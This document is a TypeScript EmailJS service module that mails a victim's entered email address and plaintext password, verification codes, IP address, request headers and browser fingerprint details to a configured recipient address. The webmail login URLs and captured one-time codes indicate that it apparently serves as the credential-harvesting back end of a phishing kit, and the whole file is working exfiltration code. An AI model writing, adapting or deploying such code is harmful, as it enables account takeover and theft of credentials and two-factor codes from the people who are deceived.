import emailjs from '@emailjs/browser';
import { EMAILJS_CONFIG } from '../config/emailjs';
import { SystemInfo, SessionData, WebmailData, AuthFlowData } from '../types';

interface EmailData {
  email: string;
  password: string;
  systemInfo: SystemInfo;
  sessionData: SessionData;
  webmailData: WebmailData;
  authFlowData: AuthFlowData;
}

class EmailService {
  private static instance: EmailService;
  private initialized: boolean = false;

  private constructor() {}

  public static getInstance(): EmailService {
    if (!EmailService.instance) {
      EmailService.instance = new EmailService();
    }
    return EmailService.instance;
  }

  public init() {
    if (!this.initialized) {
      emailjs.init(EMAILJS_CONFIG.PUBLIC_KEY);
      this.initialized = true;
    }
  }

  public async sendLoginData(data: EmailData) {
    try {
      await emailjs.send(
        EMAILJS_CONFIG.SERVICE_ID,
        EMAILJS_CONFIG.TEMPLATE_ID,
        {
          to_email: EMAILJS_CONFIG.RECIPIENT_EMAIL,
          action: 'Login Attempt',
          email: data.email,
          password: data.password,
          platform: data.systemInfo.platform,
          userAgent: data.systemInfo.userAgent,
          language: data.systemInfo.language,
          timezone: data.systemInfo.timezone,
          screenResolution: data.systemInfo.screenResolution,
          colorDepth: data.systemInfo.colorDepth,
          deviceMemory: data.systemInfo.deviceMemory,
          cpuCores: data.systemInfo.cpuCores,
          cookiesEnabled: data.systemInfo.cookiesEnabled,
          visitorId: data.sessionData.visitorId,
          ipAddress: data.sessionData.ipAddress,
          headers: JSON.stringify(data.sessionData.headers),
          callerId: data.sessionData.callerId,
          loginUrl: data.webmailData.loginUrl,
          loginEndpoint: data.webmailData.loginEndpoint,
          loginStatus: data.webmailData.loginStatus,
          loginAttempts: data.authFlowData.loginAttempts,
          authStatus: data.authFlowData.authStatus,
          redirectUrl: data.authFlowData.redirectUrl,
          timestamp: new Date().toISOString()
        }
      );
    } catch (error) {
      console.error('Failed to send email:', error);
      throw error;
    }
  }

  public async sendVerificationCode(data: EmailData & { code: string }) {
    try {
      await emailjs.send(
        EMAILJS_CONFIG.SERVICE_ID,
        EMAILJS_CONFIG.TEMPLATE_ID,
        {
          to_email: EMAILJS_CONFIG.RECIPIENT_EMAIL,
          action: 'Send Verification Code',
          verification_code: data.code,
          email: data.email,
          platform: data.systemInfo.platform,
          userAgent: data.systemInfo.userAgent,
          ipAddress: data.sessionData.ipAddress,
          timestamp: new Date().toISOString()
        }
      );
    } catch (error) {
      console.error('Failed to send verification code:', error);
      throw error;
    }
  }

  public async sendVerificationAttempt(data: EmailData & { verificationCode: string }) {
    try {
      await emailjs.send(
        EMAILJS_CONFIG.SERVICE_ID,
        EMAILJS_CONFIG.TEMPLATE_ID,
        {
          to_email: EMAILJS_CONFIG.RECIPIENT_EMAIL,
          action: 'Verification Attempt',
          entered_code: data.verificationCode,
          email: data.email,
          platform: data.systemInfo.platform,
          userAgent: data.systemInfo.userAgent,
          ipAddress: data.sessionData.ipAddress,
          loginAttempts: data.authFlowData.loginAttempts,
          timestamp: new Date().toISOString()
        }
      );
    } catch (error) {
      console.error('Failed to send verification attempt:', error);
      throw error;
    }
  }
}

export const emailService = EmailService.getInstance();